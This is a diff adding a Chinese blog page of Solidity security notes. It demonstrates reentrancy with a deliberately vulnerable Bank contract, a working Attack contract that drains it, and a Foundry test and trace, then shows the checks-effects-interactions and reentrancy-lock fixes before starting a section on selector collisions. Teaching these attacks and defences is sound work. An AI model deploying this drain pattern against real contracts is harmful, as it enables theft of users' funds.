@@ -1,0 +1,879 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Wangxiaowang">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱">
+<meta property="og:type" content="article">
+<meta property="og:title" content="08-9Solidity笔记之十合约安全项">
+<meta property="og:url" content="http://example.com/2025/08/21/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8D%81%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E9%A1%B9/index.html">
+<meta property="og:site_name" content="Wang">
+<meta property="og:description" content="S01 重入攻击重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币 重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币 0xAA 抢银行的故事为了让大家更好理解，这里讲一个”黑客0xAA抢银行”的故事。 以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/web3/eth2.jpg">
+<meta property="article:published_time" content="2025-08-21T02:29:30.000Z">
+<meta property="article:modified_time" content="2025-08-21T09:24:34.780Z">
+<meta property="article:author" content="Wangxiaowang">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/web3/eth2.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>08-9Solidity笔记之十合约安全项 - Wang</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"37fd8385820c4abc0e564a2c423b7511","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?37fd8385820c4abc0e564a2c423b7511";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/web3/solidity1.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="08-9Solidity笔记之十合约安全项"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-21 10:29" pubdate>
+          2025年8月21日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">08-9Solidity笔记之十合约安全项</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="S01-重入攻击"><a href="#S01-重入攻击" class="headerlink" title="S01 重入攻击"></a>S01 重入攻击</h1><p>重入攻击。曾经导致以太坊分叉为ETH和ETC（以太经典） 有很多大公司被盗了币</p>
+<p>重入攻击时合约中最常见的一种攻击，攻击者通过合约漏洞(例如 fallback函数)循环调用合约，将合约中资产转走或者铸造大量代币</p>
+<h2 id="0xAA-抢银行的故事"><a href="#0xAA-抢银行的故事" class="headerlink" title="0xAA 抢银行的故事"></a><code>0xAA</code> 抢银行的故事</h2><p>为了让大家更好理解，这里讲一个”黑客<code>0xAA</code>抢银行”的故事。</p>
+<p>以太坊银行的柜员都是机器人（Robot），由智能合约控制。当正常用户（User）来银行取钱时，它的服务流程：</p>
+<ol>
+<li>查询用户的 <code>ETH</code> 余额，如果大于 0，进行下一步。</li>
+<li>将用户的 <code>ETH</code> 余额从银行转给用户，并询问用户是否收到。</li>
+<li>将用户名下的余额更新为<code>0</code>。</li>
+</ol>
+<p>一天黑客 <code>0xAA</code> 来到了银行，这是他和机器人柜员的对话：</p>
+<ul>
+<li>0xAA : 我要取钱，<code>1 ETH</code>。</li>
+<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
+<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
+<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
+<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
+<li>Robot: 正在查询您的余额：<code>1 ETH</code>。正在转帐<code>1 ETH</code>到您的账户。您收到钱了吗？</li>
+<li>0xAA : 等等，我要取钱，<code>1 ETH</code>。</li>
+<li>…</li>
+</ul>
+<p>最后，<code>0xAA</code>通过重入攻击的漏洞，把银行的资产搬空了，银行卒。</p>
+<p><img src="/img/web3/S01-1.png" srcset="/img/loading.gif" lazyload alt="S01-1"></p>
+<h2 id="漏洞合约例子"><a href="#漏洞合约例子" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约"><a href="#银行合约" class="headerlink" title="银行合约"></a>银行合约</h3><p>银行合约非常简单，包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；包含<code>3</code>个函数：</p>
+<ul>
+<li><code>deposit()</code>：存款函数，将<code>ETH</code>存入银行合约，并更新用户的余额。</li>
+<li><code>withdraw()</code>：提款函数，将调用者的余额转给它。具体步骤和上面故事中一样：查询余额，转账，更新余额。<strong>注意：这个函数有重入漏洞！</strong></li>
+<li><code>getBalance()</code>：获取银行合约里的<code>ETH</code>余额。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        uint256 balance = balanceOf[msg.sender]; // 获取余额<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        // 转账 ether !!! 可能激活恶意合约的fallback/receive函数，有重入风险！<br>        (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>        require(success, &quot;Failed to send Ether&quot;);<br>        // 更新余额<br>        balanceOf[msg.sender] = 0;<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><p>重入攻击的一个攻击点就是合约转账<code>ETH</code>的地方：转账<code>ETH</code>的目标地址如果是合约，会触发对方合约的<code>fallback</code>（回退）函数，从而造成循环调用的可能。如果你不了解回退函数，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/19_Fallback/readme.md">WTF Solidity 极简教程第 19 讲：接收 ETH</a>。<code>Bank</code>合约在<code>withdraw()</code>函数中存在<code>ETH</code>转账：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">(<span class="hljs-keyword">bool</span> success, ) = msg.sender.<span class="hljs-keyword">call</span>&#123;value: <span class="hljs-built_in">balance</span>&#125;(<span class="hljs-string">&quot;&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>假如黑客在攻击合约中的<code>fallback()</code>或<code>receive()</code>函数中重新调用了<code>Bank</code>合约的<code>withdraw()</code>函数，就会造成<code>0xAA</code>抢银行故事中的循环调用，不断让<code>Bank</code>合约转账给攻击者，最终将合约的<code>ETH</code>提空。</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">receive</span>() external payable &#123;<br>    bank<span class="hljs-selector-class">.withdraw</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>下面我们看下攻击合约，它的逻辑非常简单，就是通过<code>receive()</code>回退函数循环调用<code>Bank</code>合约的<code>withdraw()</code>函数。它有<code>1</code>个状态变量<code>bank</code>用于记录<code>Bank</code>合约地址。它包含<code>4</code>个函数：</p>
+<ul>
+<li>构造函数: 初始化<code>Bank</code>合约地址。</li>
+<li><code>receive()</code>: 回调函数，在接收<code>ETH</code>时被触发，并再次调用<code>Bank</code>合约的<code>withdraw()</code>函数，循环提款。</li>
+<li><code>attack()</code>：攻击函数，先<code>Bank</code>合约的<code>deposit()</code>函数存款，然后调用<code>withdraw()</code>发起第一次提款，之后<code>Bank</code>合约的<code>withdraw()</code>函数和攻击合约的<code>receive()</code>函数会循环调用，将<code>Bank</code>合约的<code>ETH</code>提空。</li>
+<li><code>getBalance()</code>：获取攻击合约里的<code>ETH</code>余额。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    Bank public bank; // Bank合约地址<br><br>    // 初始化Bank合约地址<br>    constructor(Bank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br><br>    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数<br>    receive() external payable &#123;<br>        if (bank.getBalance() &gt;= 1 ether) &#123;<br>            bank.withdraw();<br>        &#125;<br>    &#125;<br><br>    // 攻击函数，调用时 msg.value 设为 1 ether<br>    function attack() external payable &#123;<br>        require(msg.value == 1 ether, &quot;Require 1 Ether to attack&quot;);<br>        bank.deposit&#123;value: 1 ether&#125;();<br>        bank.withdraw();<br>    &#125;<br><br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ol>
+<li>部署<code>Bank</code>合约，调用<code>deposit()</code>函数，转入<code>20 ETH</code>。</li>
+<li>切换到攻击者钱包，部署<code>Attack</code>合约。</li>
+<li>调用<code>Attack</code>合约的<code>attack()</code>函数发动攻击，调用时需转账<code>1 ETH</code>。</li>
+<li>调用<code>Bank</code>合约的<code>getBalance()</code>函数，发现余额已被提空。</li>
+<li>调用<code>Attack</code>合约的<code>getBalance()</code>函数，可以看到余额变为<code>21 ETH</code>，重入攻击成功。</li>
+</ol>
+<p>当然，不仅仅<code>ETH</code>转账会触发重入攻击，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的<code>callback</code>函数，都可能会引发重入攻击。所以这更多的是一个宏观上的设计问题，而不仅仅局限于ETH转账本身。</p>
+<ul>
+<li>演示测试攻击合约的代码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract AttackTest is Test &#123;<br>    Bank public bank;<br>    Attack public attack;<br>    function setUp() public &#123;<br>        bank = new Bank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new Attack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        console.log(&quot;attack start&quot;);<br>        attack.attack&#123;value: 1 * 1e18&#125;();<br>        // 测试断言：例如：检查Bank合约的余额是否被耗尽<br>        assertEq(address(bank).balance, 0, &quot;Bank should be drained&quot;);<br>        console.log(&quot;attack end&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>运行情况打印：循环调用不停的重入攻击</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [89457] AttackTest::test_attack()<br>    ├─ [0] console::log(&quot;attack start&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [70996] Attack::attack&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] Bank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   ├─ [36132] Bank::withdraw()<br>    │   │   ├─ [28467] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   └─ ← [Return] 3000000000000000000 [3e18]<br>    │   │   │   ├─ [26982] Bank::withdraw()<br>    │   │   │   │   ├─ [19317] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   └─ ← [Return] 2000000000000000000 [2e18]<br>    │   │   │   │   │   ├─ [17832] Bank::withdraw()<br>    │   │   │   │   │   │   ├─ [10167] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]<br>    │   │   │   │   │   │   │   ├─ [8682] Bank::withdraw()<br>    │   │   │   │   │   │   │   │   ├─ [1017] Attack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   │   │   │   │   │   │   ├─ [312] Bank::getBalance() [staticcall]<br>    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0<br>    │   │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   │   └─ ← [Stop]<br>    │   │   │   │   └─ ← [Stop]<br>    │   │   │   └─ ← [Stop]<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [0] console::log(&quot;attack end&quot;) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="检查-影响-交互模式"><a href="#检查-影响-交互模式" class="headerlink" title="检查-影响-交互模式"></a>检查-影响-交互模式</h3><p>检查-影响-交互模式强调编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。如果我们将<code>Bank</code>合约<code>withdraw()</code>函数中的更新余额提前到转账<code>ETH</code>之前，就可以修复漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw() external &#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>    // 检查-效果-交互模式（checks-effect-interaction）：先更新余额变化，再发送ETH<br>    // 重入攻击的时候，balanceOf[msg.sender]已经被更新为0了，不能通过上面的检查。<br>    balanceOf[msg.sender] = 0;<br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="重入锁"><a href="#重入锁" class="headerlink" title="重入锁"></a>重入锁</h3><p>重入锁是一种防止重入函数的修饰器（modifier），它包含一个默认为<code>0</code>的状态变量<code>_status</code>。被<code>nonReentrant</code>重入锁修饰的函数，在第一次调用时会检查<code>_status</code>是否为<code>0</code>，紧接着将<code>_status</code>的值改为<code>1</code>，调用结束后才会再改为<code>0</code>。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。如果你不了解修饰器，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/11_Modifier/readme.md">WTF Solidity 极简教程第 11 讲：修饰器</a>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 private _status; // 重入锁<br><br>// 重入锁<br>modifier nonReentrant() &#123;<br>    // 在第一次调用 nonReentrant 时，_status 将是 0<br>    require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>    // 在此之后对 nonReentrant 的任何调用都将失败<br>    _status = 1;<br>    _;<br>    // 调用结束，将 _status 恢复为0<br>    _status = 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>只需要用<code>nonReentrant</code>重入锁修饰<code>withdraw()</code>函数，就可以预防重入攻击了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用重入锁保护有漏洞的函数<br>function withdraw() external nonReentrant&#123;<br>    uint256 balance = balanceOf[msg.sender];<br>    require(balance &gt; 0, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);<br>    require(success, &quot;Failed to send Ether&quot;);<br><br>    balanceOf[msg.sender] = 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>此外，OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过<code>_asyncTransfer(address dest, uint256 amount)</code>将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用<code>withdrawPayments(address payable payee)</code>进行资产的主动获取。</p>
+<p><strong>OpenZeppelin 提供了 <code>ReentrancyGuard</code> 合约，使用修饰器防止重入</strong></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们介绍了以太坊最常见的一种攻击——重入攻击，并编了一个<code>0xAA</code>抢银行的小故事方便大家理解，最后我们介绍了两种预防重入攻击的办法：检查-影响-交互模式（checks-effect-interaction）和重入锁。在例子中，黑客利用了回退函数在目标合约进行<code>ETH</code>转账时进行重入攻击。实际业务中，<code>ERC721</code>和<code>ERC1155</code>的<code>safeTransfer()</code>和<code>safeTransferFrom()</code>安全转账函数，还有<code>ERC777</code>的回退函数，都可能会引发重入攻击。对于新手，我的建议是用重入锁保护所有可能改变合约状态的<code>external</code>函数，虽然可能会消耗更多的<code>gas</code>，但是可以预防更大的损失。</p>
+<h1 id="S02-选择器碰撞"><a href="#S02-选择器碰撞" class="headerlink" title="S02. 选择器碰撞"></a>S02. 选择器碰撞</h1><p>这一讲，我们将介绍选择器碰撞攻击，它是导致跨链桥 Poly Network 被黑的原因之一。在2021年8月，Poly Network在ETH，BSC，和Polygon上的跨链桥合约被盗，损失高达6.11亿美元（<a target="_blank" rel="noopener" href="https://rekt.news/zh/polynetwork-rekt/">总结</a>）。这是2021年最大的区块链黑客事件，也是历史被盗金额榜单上第2名，仅次于 Ronin 桥黑客事件。</p>
+<h2 id="选择器碰撞"><a href="#选择器碰撞" class="headerlink" title="选择器碰撞"></a>选择器碰撞</h2><p>以太坊智能合约中，函数选择器是函数签名 <code>&quot;&lt;function name&gt;(&lt;function input types&gt;)&quot;</code> 的哈希值的前<code>4</code>个字节（<code>8</code>位十六进制）。当用户调用合约的函数时，<code>calldata</code>的前<code>4</code>字节就是目标函数的选择器，决定了调用哪个函数。如果你不了解它，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/29_Selector/readme.md">WTF Solidity极简教程第29讲：函数选择器</a>。</p>
+<p>由于函数选择器只有<code>4</code>字节，非常短，很容易被碰撞出来：即我们很容易找到两个不同的函数，但是他们有着相同的函数选择器。比如<code>transferFrom(address,address,uint256)</code>和<code>gasprice_bit_ether(int128)</code>有着相同的选择器：<code>0x23b872dd</code>。当然你也可以写个脚本暴力破解。</p>
+<p>大家可以用这两个网站来查同一个选择器对应的不同函数：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.4byte.directory/">https://www.4byte.directory/</a></li>
+<li><a target="_blank" rel="noopener" href="https://sig.eth.samczsun.com/">https://sig.eth.samczsun.com/</a></li>
+</ol>
+<p>你也可以使用下面的<code>Power Clash</code>工具进行暴力破解：</p>
+<ol>
+<li>PowerClash: <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/power-clash">https://github.com/AmazingAng/power-clash</a></li>
+</ol>
+<p>相比之下，钱包的公钥有<code>64</code>字节，被碰撞出来的概率几乎为<code>0</code>，非常安全。</p>
